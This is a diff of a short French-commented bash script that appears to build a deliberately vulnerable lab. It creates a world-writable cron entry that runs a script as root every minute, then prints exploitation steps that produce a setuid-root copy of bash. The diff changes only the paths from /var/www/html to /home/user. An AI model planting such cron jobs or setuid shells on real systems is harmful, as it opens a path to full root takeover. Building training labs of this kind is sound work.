@@ -1,11 +1,11 @@
 #!/bin/bash
 # Création d'une tâche cron modifiable
 
-mkdir -p /var/www/html/etc/cron.d/
-echo "* * * * * root /var/www/html/tmp/malicious.sh" > /var/www/html/etc/cron.d/vuln_cron
-chmod 777 /var/www/html/etc/cron.d/vuln_cron
+mkdir -p /home/user/etc/cron.d/
+echo "* * * * * root /home/user/tmp/malicious.sh" > /home/user/etc/cron.d/vuln_cron
+chmod 777 /home/user/etc/cron.d/vuln_cron
 
 echo "✅ Cron vulnérable. Exploitation :
-echo '#!/bin/bash' > /var/www/html/tmp/malicious.sh
-echo 'cp /bin/bash /var/www/html/tmp/rootbash && chmod 4755 /var/www/html/tmp/rootbash' >> /var/www/html/tmp/malicious.sh
-chmod +x /var/www/html/tmp/malicious.sh"
+echo '#!/bin/bash' > /home/user/tmp/malicious.sh
+echo 'cp /bin/bash /home/user/tmp/rootbash && chmod 4755 /home/user/tmp/rootbash' >> /home/user/tmp/malicious.sh
+chmod +x /home/user/tmp/malicious.sh"
